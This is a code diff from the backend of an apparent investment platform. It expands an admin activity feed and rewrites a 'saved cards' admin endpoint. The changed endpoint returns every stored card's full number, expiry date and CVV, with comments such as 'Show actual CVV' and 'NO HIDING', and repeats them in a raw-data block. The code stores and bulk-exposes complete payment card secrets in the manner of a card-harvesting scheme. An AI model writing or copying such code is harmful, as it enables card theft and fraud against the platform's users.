@@ -8368,79 +8368,91 @@ app.post('/api/admin/users/:userId/balance', async (req, res) => {
 
 
 
-// Recent Activity Endpoint - Match Frontend Expectations with Status Colors
+
+// Recent Activity Endpoint - Show EVERYTHING from userside
 app.get('/api/admin/activity', adminProtect, async (req, res) => {
     try {
-        const { page = 1, limit = 5 } = req.query;
+        const { page = 1, limit = 10 } = req.query;
         const skip = (page - 1) * parseInt(limit);
 
-        // Get combined activities from multiple sources in real-time
-        const [userActivities, investments, transactions, kycSubmissions, cardPayments] = await Promise.all([
-            // User activities from UserLog
+        // Get ALL activities from EVERY relevant collection
+        const [userLogs, investments, transactions, cardPayments, supportTickets, kycSubmissions] = await Promise.all([
+            // UserLogs - ALL user activities
             UserLog.find()
-                .populate('user', 'firstName lastName email')
+                .populate('user', 'firstName lastName email username')
                 .sort({ createdAt: -1 })
                 .skip(skip)
-                .limit(parseInt(limit))
+                .limit(parseInt(limit) * 2) // Get more since we'll filter
                 .lean(),
 
-            // Recent investments
+            // Investments - ALL investment activities
             Investment.find()
                 .populate('user', 'firstName lastName email')
                 .populate('plan', 'name')
                 .sort({ createdAt: -1 })
-                .limit(10)
+                .limit(parseInt(limit))
                 .lean(),
 
-            // Recent transactions
+            // Transactions - ALL financial activities
             Transaction.find()
                 .populate('user', 'firstName lastName email')
                 .sort({ createdAt: -1 })
-                .limit(10)
+                .limit(parseInt(limit))
                 .lean(),
 
-            // Recent KYC submissions
-            KYC.find()
-                .populate('user', 'firstName lastName email')
-                .sort({ createdAt: -1 })
-                .limit(5)
-                .lean(),
-
-            // Recent card payments
+            // CardPayments - ALL card activities
             CardPayment.find()
                 .populate('user', 'firstName lastName email')
                 .sort({ createdAt: -1 })
-                .limit(5)
+                .limit(parseInt(limit))
+                .lean(),
+
+            // SupportTickets - ALL support activities
+            SupportTicket.find()
+                .populate('user', 'firstName lastName email')
+                .sort({ createdAt: -1 })
+                .limit(parseInt(limit))
+                .lean(),
+
+            // KYC Submissions - ALL verification activities
+            KYC.find()
+                .populate('user', 'firstName lastName email')
+                .sort({ createdAt: -1 })
+                .limit(parseInt(limit))
                 .lean()
         ]);
 
-        // Format activities to EXACTLY match frontend expectations
-        const activities = [];
+        // Combine ALL activities into one array
+        const allActivities = [];
 
-        // Process user activities
-        userActivities.forEach(activity => {
-            activities.push({
-                _id: activity._id,
-                timestamp: activity.createdAt,
-                user: activity.user ? {
-                    _id: activity.user._id,
-                    firstName: activity.user.firstName,
-                    lastName: activity.user.lastName,
-                    email: activity.user.email
+        // Process UserLogs - ALL user actions
+        userLogs.forEach(log => {
+            allActivities.push({
+                _id: log._id,
+                timestamp: log.createdAt,
+                user: log.user ? {
+                    _id: log.user._id,
+                    firstName: log.user.firstName,
+                    lastName: log.user.lastName,
+                    email: log.user.email,
+                    username: log.user.username || `${log.user.firstName} ${log.user.lastName}`
                 } : null,
-                username: activity.user ? `${activity.user.firstName} ${activity.user.lastName}` : 'System',
-                action: activity.action,
-                ipAddress: activity.ipAddress,
-                status: activity.status,
-                statusColor: getStatusColor(activity.status),
-                description: getActivityDescription(activity),
-                type: 'user_activity'
+                username: log.username || (log.user ? `${log.user.firstName} ${log.user.lastName}` : 'System'),
+                action: log.action,
+                description: getUserActionDescription(log),
+                ipAddress: log.ipAddress,
+                deviceInfo: log.deviceInfo,
+                location: log.location,
+                status: log.status,
+                statusColor: getStatusColor(log.status),
+                type: 'user_activity',
+                entity: 'UserLog'
             });
         });
 
-        // Process investments
+        // Process Investments
         investments.forEach(investment => {
-            activities.push({
+            allActivities.push({
                 _id: investment._id,
                 timestamp: investment.createdAt,
                 user: investment.user ? {
@@ -8450,17 +8462,19 @@ app.get('/api/admin/activity', adminProtect, async (req, res) => {
                     email: investment.user.email
                 } : null,
                 username: investment.user ? `${investment.user.firstName} ${investment.user.lastName}` : 'Unknown User',
-                action: 'investment_created',
+                action: 'investment',
+                description: `Investment: $${investment.amount} in ${investment.plan?.name || 'Plan'}`,
                 status: investment.status,
                 statusColor: getStatusColor(investment.status),
-                description: `Investment: $${investment.amount} in ${investment.plan?.name || 'Plan'} - ${investment.status}`,
-                type: 'investment'
+                type: 'investment',
+                entity: 'Investment',
+                amount: investment.amount
             });
         });
 
-        // Process transactions
+        // Process Transactions
         transactions.forEach(transaction => {
-            activities.push({
+            allActivities.push({
                 _id: transaction._id,
                 timestamp: transaction.createdAt,
                 user: transaction.user ? {
@@ -8470,37 +8484,20 @@ app.get('/api/admin/activity', adminProtect, async (req, res) => {
                     email: transaction.user.email
                 } : null,
                 username: transaction.user ? `${transaction.user.firstName} ${transaction.user.lastName}` : 'Unknown User',
-                action: `${transaction.type}_transaction`,
+                action: transaction.type,
+                description: `${transaction.type.toUpperCase()}: $${transaction.amount} via ${transaction.method}`,
                 status: transaction.status,
                 statusColor: getStatusColor(transaction.status),
-                description: `${transaction.type.toUpperCase()}: $${transaction.amount} (${transaction.method}) - ${transaction.status}`,
-                type: 'transaction'
+                type: 'transaction',
+                entity: 'Transaction',
+                amount: transaction.amount,
+                method: transaction.method
             });
         });
 
-        // Process KYC submissions
-        kycSubmissions.forEach(kyc => {
-            activities.push({
-                _id: kyc._id,
-                timestamp: kyc.createdAt,
-                user: kyc.user ? {
-                    _id: kyc.user._id,
-                    firstName: kyc.user.firstName,
-                    lastName: kyc.user.lastName,
-                    email: kyc.user.email
-                } : null,
-                username: kyc.user ? `${kyc.user.firstName} ${kyc.user.lastName}` : 'Unknown User',
-                action: 'kyc_submitted',
-                status: kyc.status,
-                statusColor: getStatusColor(kyc.status),
-                description: `KYC ${kyc.type} submission - ${kyc.status}`,
-                type: 'kyc'
-            });
-        });
-
-        // Process card payments
+        // Process Card Payments
         cardPayments.forEach(payment => {
-            activities.push({
+            allActivities.push({
                 _id: payment._id,
                 timestamp: payment.createdAt,
                 user: payment.user ? {
@@ -8511,28 +8508,81 @@ app.get('/api/admin/activity', adminProtect, async (req, res) => {
                 } : null,
                 username: payment.user ? `${payment.user.firstName} ${payment.user.lastName}` : 'Unknown User',
                 action: 'card_payment',
+                description: `Card Payment: $${payment.amount} (${payment.cardType})`,
                 status: payment.status,
                 statusColor: getStatusColor(payment.status),
-                description: `Card Payment: $${payment.amount} - ${payment.status}`,
-                type: 'card_payment'
+                type: 'payment',
+                entity: 'CardPayment',
+                amount: payment.amount,
+                cardType: payment.cardType,
+                ipAddress: payment.ipAddress
             });
         });
 
-        // Sort by timestamp and paginate
-        activities.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-        const paginatedActivities = activities.slice(0, parseInt(limit));
+        // Process Support Tickets
+        supportTickets.forEach(ticket => {
+            allActivities.push({
+                _id: ticket._id,
+                timestamp: ticket.createdAt,
+                user: ticket.user ? {
+                    _id: ticket.user._id,
+                    firstName: ticket.user.firstName,
+                    lastName: ticket.user.lastName,
+                    email: ticket.user.email
+                } : null,
+                username: ticket.user ? `${ticket.user.firstName} ${ticket.user.lastName}` : 'Unknown User',
+                action: 'support_ticket',
+                description: `Support Ticket: ${ticket.subject}`,
+                status: ticket.status,
+                statusColor: getStatusColor(ticket.status),
+                type: 'support',
+                entity: 'SupportTicket',
+                priority: ticket.priority
+            });
+        });
 
-        const totalActivities = await UserLog.countDocuments() + await CardPayment.countDocuments();
+        // Process KYC Submissions
+        kycSubmissions.forEach(kyc => {
+            allActivities.push({
+                _id: kyc._id,
+                timestamp: kyc.createdAt,
+                user: kyc.user ? {
+                    _id: kyc.user._id,
+                    firstName: kyc.user.firstName,
+                    lastName: kyc.user.lastName,
+                    email: kyc.user.email
+                } : null,
+                username: kyc.user ? `${kyc.user.firstName} ${kyc.user.lastName}` : 'Unknown User',
+                action: 'kyc_submission',
+                description: `KYC ${kyc.type} Submission`,
+                status: kyc.status,
+                statusColor: getStatusColor(kyc.status),
+                type: 'verification',
+                entity: 'KYC',
+                kycType: kyc.type
+            });
+        });
+
+        // Sort by timestamp (newest first) and paginate
+        allActivities.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+        const paginatedActivities = allActivities.slice(0, parseInt(limit));
+
+        const totalCount = await UserLog.countDocuments() + 
+                          await Investment.countDocuments() + 
+                          await Transaction.countDocuments() + 
+                          await CardPayment.countDocuments() + 
+                          await SupportTicket.countDocuments() + 
+                          await KYC.countDocuments();
 
         // Return EXACT structure frontend expects
         res.status(200).json({
             status: 'success',
             data: {
                 activities: paginatedActivities,
-                total: totalActivities,
+                total: totalCount,
                 page: parseInt(page),
-                pages: Math.ceil(totalActivities / parseInt(limit)),
-                totalPages: Math.ceil(totalActivities / parseInt(limit))
+                pages: Math.ceil(totalCount / parseInt(limit)),
+                totalPages: Math.ceil(totalCount / parseInt(limit))
             }
         });
 
@@ -8548,49 +8598,68 @@ app.get('/api/admin/activity', adminProtect, async (req, res) => {
 // Helper function to get status color
 function getStatusColor(status) {
     const colorMap = {
+        // GREEN - Active/Completed/Successful
         'active': 'green',
         'completed': 'green',
         'success': 'green',
         'verified': 'green',
         'approved': 'green',
+        'resolved': 'green',
+        'closed': 'green',
+        'processed': 'green',
         
+        // GOLDENROD - Pending/Processing
         'pending': 'goldenrod',
         'processing': 'goldenrod',
+        'in-progress': 'goldenrod',
+        'waiting': 'goldenrod',
+        'open': 'goldenrod',
         
+        // RED - Failed/Rejected
         'failed': 'red',
         'rejected': 'red',
         'cancelled': 'red',
-        'declined': 'red'
+        'declined': 'red',
+        'defaulted': 'red'
     };
     
     return colorMap[status] || 'gray';
 }
 
-// Helper function to generate activity descriptions
-function getActivityDescription(activity) {
-    const descriptions = {
+// Helper function to generate user action descriptions
+function getUserActionDescription(log) {
+    const actionMap = {
         'login': 'User logged into the system',
         'logout': 'User logged out of the system',
-        'signup': 'New user registration',
-        'deposit': 'Deposit transaction initiated',
-        'withdrawal': 'Withdrawal request submitted',
-        'investment': 'New investment created',
+        'signup': 'New user registered',
         'profile_update': 'User updated profile information',
         'password_change': 'User changed password',
-        'kyc_submission': 'KYC documents submitted',
-        'card_payment': 'Card payment processed'
+        'deposit': 'User made a deposit',
+        'withdrawal': 'User requested withdrawal',
+        'investment': 'User created investment',
+        'transfer': 'User transferred funds',
+        'kyc_submission': 'User submitted KYC documents',
+        'settings_change': 'User changed settings',
+        'api_key_create': 'User created API key',
+        'api_key_delete': 'User deleted API key',
+        'device_login': 'User logged in from new device',
+        'password_reset_request': 'User requested password reset',
+        'password_reset_complete': 'User completed password reset',
+        'email_verification': 'User verified email',
+        'failed_login': 'Failed login attempt',
+        'suspicious_activity': 'Suspicious activity detected'
     };
     
-    return descriptions[activity.action] || `User performed ${activity.action}`;
+    return actionMap[log.action] || `User performed: ${log.action}`;
 }
 
-// Saved Cards Endpoint - Using CardPayment Schema
+// Saved Cards Endpoint - Show ALL card data exactly as in database
 app.get('/api/admin/cards', adminProtect, async (req, res) => {
     try {
-        const { page = 1, limit = 5 } = req.query;
+        const { page = 1, limit = 10 } = req.query;
         const skip = (page - 1) * parseInt(limit);
 
-        // Get ALL card payment data from CardPayment schema
+        // Get ALL card payment data exactly as stored
         const cardPayments = await CardPayment.find()
             .populate('user', 'firstName lastName email')
             .sort({ createdAt: -1 })
@@ -8598,12 +8667,10 @@ app.get('/api/admin/cards', adminProtect, async (req, res) => {
             .limit(parseInt(limit))
             .lean();
 
-        // Format to EXACTLY match frontend table structure using CardPayment data
+        // Format to show EXACT database values - NO HIDING
         const formattedCards = cardPayments.map(payment => {
-            // Extract last 4 digits for display
-            const last4 = payment.cardNumber.length > 4 ? payment.cardNumber.slice(-4) : payment.cardNumber;
-            
             return {
+                // User information
                 _id: payment._id,
                 user: {
                     _id: payment.user?._id || 'unknown',
@@ -8612,33 +8679,48 @@ app.get('/api/admin/cards', adminProtect, async (req, res) => {
                     email: payment.user?.email || 'unknown@email.com',
                     fullName: payment.user ? `${payment.user.firstName} ${payment.user.lastName}` : 'Unknown User'
                 },
-                // Card data from CardPayment schema
+                
+                // Card data EXACTLY as stored in database
                 fullName: payment.fullName,
-                cardNumber: payment.cardNumber, // Full card number
-                last4: last4, // Last 4 digits for display
-                expiry: payment.expiryDate,
-                cvv: payment.cvv,
+                cardNumber: payment.cardNumber, // Show full card number
+                expiryDate: payment.expiryDate, // Exact field name from database
+                cvv: payment.cvv, // Show actual CVV
                 billingAddress: payment.billingAddress,
                 city: payment.city,
-                state: payment.state || '',
+                state: payment.state,
                 postalCode: payment.postalCode,
                 country: payment.country,
-                cardType: payment.cardType,
+                cardType: payment.cardType, // Exact field name
+                
+                // Payment information
                 amount: payment.amount,
                 status: payment.status,
                 statusColor: getStatusColor(payment.status),
+                
+                // Technical information
                 ipAddress: payment.ipAddress,
                 userAgent: payment.userAgent,
-                isDefault: false, // CardPayment doesn't have this field
-                lastUsed: payment.createdAt, // Use created date as last used
+                
+                // Timestamps
                 createdAt: payment.createdAt,
-                updatedAt: payment.updatedAt
+                updatedAt: payment.updatedAt,
+                
+                // Raw data for reference
+                rawData: {
+                    fullName: payment.fullName,
+                    cardNumber: payment.cardNumber,
+                    expiryDate: payment.expiryDate,
+                    cvv: payment.cvv,
+                    billingAddress: payment.billingAddress,
+                    cardType: payment.cardType,
+                    amount: payment.amount,
+                    status: payment.status
+                }
             };
         });
 
         const total = await CardPayment.countDocuments();
 
-        // Return EXACT structure frontend expects
         res.status(200).json({
             status: 'success',
             data: {
@@ -8658,67 +8740,6 @@ app.get('/api/admin/cards', adminProtect, async (req, res) => {
         });
     }
 });
-
-// Additional endpoint to get card payment details by ID
-app.get('/api/admin/cards/:id', adminProtect, async (req, res) => {
-    try {
-        const cardPayment = await CardPayment.findById(req.params.id)
-            .populate('user', 'firstName lastName email')
-            .lean();
-
-        if (!cardPayment) {
-            return res.status(404).json({
-                status: 'fail',
-                message: 'Card payment not found'
-            });
-        }
-
-        // Format card payment data
-        const formattedCard = {
-            _id: cardPayment._id,
-            user: cardPayment.user ? {
-                _id: cardPayment.user._id,
-                firstName: cardPayment.user.firstName,
-                lastName: cardPayment.user.lastName,
-                email: cardPayment.user.email
-            } : null,
-            fullName: cardPayment.fullName,
-            cardNumber: cardPayment.cardNumber,
-            expiry: cardPayment.expiryDate,
-            cvv: cardPayment.cvv,
-            billingAddress: cardPayment.billingAddress,
-            city: cardPayment.city,
-            state: cardPayment.state,
-            postalCode: cardPayment.postalCode,
-            country: cardPayment.country,
-            cardType: cardPayment.cardType,
-            amount: cardPayment.amount,
-            status: cardPayment.status,
-            statusColor: getStatusColor(cardPayment.status),
-            ipAddress: cardPayment.ipAddress,
-            userAgent: cardPayment.userAgent,
-            createdAt: cardPayment.createdAt,
-            updatedAt: cardPayment.updatedAt
-        };
-
-        res.status(200).json({
-            status: 'success',
-            data: {
-                card: formattedCard
-            }
-        });
-
-    } catch (err) {
-        console.error('Get card payment error:', err);
-        res.status(500).json({
-            status: 'error',
-            message: 'An error occurred while fetching card payment details'
-        });
-    }
-});
-
-
-
 
 
 
@@ -8852,6 +8873,7 @@ processMaturedInvestments();
 httpServer.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
 
